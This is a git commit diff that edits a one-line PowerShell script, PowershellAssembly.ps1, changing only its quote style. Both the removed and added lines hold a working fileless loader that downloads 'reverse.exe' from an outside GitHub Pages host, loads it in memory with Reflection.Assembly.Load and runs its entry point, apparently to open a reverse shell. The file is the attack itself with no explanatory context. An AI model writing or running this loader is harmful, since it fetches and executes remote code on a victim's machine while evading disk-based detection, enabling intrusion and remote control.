0a43b06cb55c21411faa1eaa19ffd6792250d566
HakkYahud <108320420+HakkYahud@users.noreply.github.com>
2023-03-27 10:00:10 +0200

    Update PowershellAssembly.ps1

--- PowershellAssembly.ps1
+++ PowershellAssembly.ps1
@@ -1,1 +1,1 @@
-$assemblyByte=(New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/reverse.exe");$assembly=[System.Reflection.Assembly]::Load($assemblyByte);$assembly.EntryPoint.Invoke($null, $null)
+$assemblyByte=(New-Object Net.WebClient).DownloadData('https://hakkyahud.github.io/reverse.exe');$assembly=[System.Reflection.Assembly]::Load($assemblyByte);$assembly.EntryPoint.Invoke($null, $null)
